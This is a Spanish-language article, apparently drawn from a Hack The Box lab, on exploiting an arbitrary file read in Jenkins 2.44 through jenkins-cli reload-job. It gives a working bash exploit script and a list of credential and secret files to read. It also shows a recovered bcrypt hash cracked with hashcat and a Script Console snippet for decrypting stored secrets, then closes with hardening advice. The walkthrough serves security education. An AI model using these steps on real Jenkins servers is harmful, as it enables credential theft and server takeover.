@@ -1,0 +1,119 @@
+TÍTULO: Cómo un Bug Bounty de $5,000 Puede Nacer de una Lectura Arbitraria de Archivos en Jenkins
+AUTOR: zSodex
+FECHA: Apr 2, 2025
+URL: https://medium.com/@zsodex/explotaci%C3%B3n-de-jenkins-lectura-arbitraria-de-archivos-y-escalada-de-privilegios-00197146678e
+
+════════════════════════════════════════════════════════════
+
+Jenkins es una plataforma de integración continua ampliamente adoptada en entornos DevOps. Sin embargo, cuando no se implementan medidas de seguridad adecuadas, puede convertirse en un vector de ataque crítico. En este artículo, exploraremos la explotación de una vulnerabilidad de lectura arbitraria de archivos presente en Jenkins (versión 2.44), mediante la cual es posible acceder a información sensible del sistema y escalar privilegios.
+
+────────────────────────────────────────────────────────────
+1. Vulnerabilidad: Lectura Arbitraria de Archivos en Jenkins
+────────────────────────────────────────────────────────────
+
+En versiones antiguas de Jenkins como la 2.44, se ha identificado una vulnerabilidad que permite la lectura arbitraria de archivos en el sistema mediante la funcionalidad reload-job del jenkins-cli. Este problema surge debido a una validación inadecuada de rutas de archivos.
+
+Explotación Básica — Script en Bash:
+
+    #!/bin/bash
+    output=$(java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080/' "reload-job" @"$1" 2>&1)
+    result=$(echo "$output" | sed "s/^.*No such item '\(.*\)' exists.*$/\1/")
+    echo "$result"
+
+Ejemplo de uso:
+
+    ./exploit.sh /ruta/del/archivo
+
+Créditos del script: https://lanzt.github.io/htb/builder
+
+────────────────────────────────────────────────────────────
+2. Extracción de Archivos Sensibles
+────────────────────────────────────────────────────────────
+
+Una vez confirmada la vulnerabilidad, se puede acceder a archivos críticos:
+
+Archivos de configuración y credenciales:
+- /var/jenkins_home/config.xml → Configuración principal
+- /var/jenkins_home/credentials.xml → Credenciales almacenadas
+- /var/jenkins_home/secrets/initialAdminPassword → Contraseña temporal de admin
+- /var/jenkins_home/secrets/master.key → Clave para descifrar credentials.xml
+- /var/jenkins_home/secrets/hudson.util.Secret → Clave de cifrado de Jenkins
+
+Archivos de usuarios y autenticación:
+- /var/jenkins_home/users/users.xml → Lista de usuarios registrados
+- /var/jenkins_home/users/<usuario>/config.xml → Config. por usuario
+
+Archivos de registros y auditoría:
+- /var/log/jenkins/jenkins.log
+- /var/jenkins_home/jobs/<job>/builds/<build>/log
+
+a) Identificación de Usuarios:
+
+    ./exploit.sh /var/jenkins_home/users/users.xml
+
+Ejemplo de salida:
+
+    <?xml version='1.1' encoding='UTF-8'?>
+    <entry>
+      <string>jennifer</string>
+    </entry>
+
+b) Obtención de Credenciales de Usuario:
+
+    ./exploit.sh /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
+
+Datos obtenidos:
+- Usuario: jennifer
+- Hash de contraseña: $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
+
+────────────────────────────────────────────────────────────
+3. Descifrado de Credenciales con Hashcat
+────────────────────────────────────────────────────────────
+
+El hash está en formato bcrypt ($2a$), descifrable con Hashcat:
+
+    echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > hash.txt
+    hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+Resultado: princess (contraseña en texto plano).
+
+────────────────────────────────────────────────────────────
+4. Descifrando Credenciales con la Script Console
+────────────────────────────────────────────────────────────
+
+Jenkins proporciona una Script Console que permite ejecutar código con los mismos privilegios que el servidor. Ruta de acceso: http://<jenkins-server>/script
+
+Jenkins utiliza hudson.util.Secret para cifrar credenciales. Si se encuentran credenciales cifradas en credentials.xml, se pueden descifrar así:
+
+    import jenkins.model.*
+    import hudson.util.*
+    println Secret.decrypt("{AQAAABAAAAAQ5gvG8Y9M6y...}")
+
+────────────────────────────────────────────────────────────
+5. Escenarios de Explotación Comunes
+────────────────────────────────────────────────────────────
+
+- Acceso inicial mediante credenciales débiles (admin:admin)
+- Lectura arbitraria de archivos vía reload-job → credentials.xml
+- Ejecución remota de código mediante la Script Console
+
+────────────────────────────────────────────────────────────
+6. Medidas de Seguridad para Proteger Jenkins
+────────────────────────────────────────────────────────────
+
+✅ Actualizar Jenkins a su versión más reciente y estable.
+✅ Restringir el acceso a jenkins-cli y la Script Console.
+✅ Implementar autenticación robusta con contraseñas seguras y MFA.
+✅ Monitorear registros de actividad para identificar accesos sospechosos.
+✅ Deshabilitar plugins innecesarios, reduciendo la superficie de ataque.
+✅ Aplicar principio de privilegios mínimos.
+
+────────────────────────────────────────────────────────────
+Conclusión
+────────────────────────────────────────────────────────────
+
+Jenkins es una herramienta fundamental para la integración continua, pero su seguridad depende de una configuración y gestión adecuadas. En este análisis, exploramos cómo una vulnerabilidad de lectura arbitraria de archivos puede facilitar la extracción de credenciales, el descifrado de secretos y la escalada de privilegios.
+
+════════════════════════════════════════════════════════════
+FIN DEL ARTÍCULO
+════════════════════════════════════════════════════════════
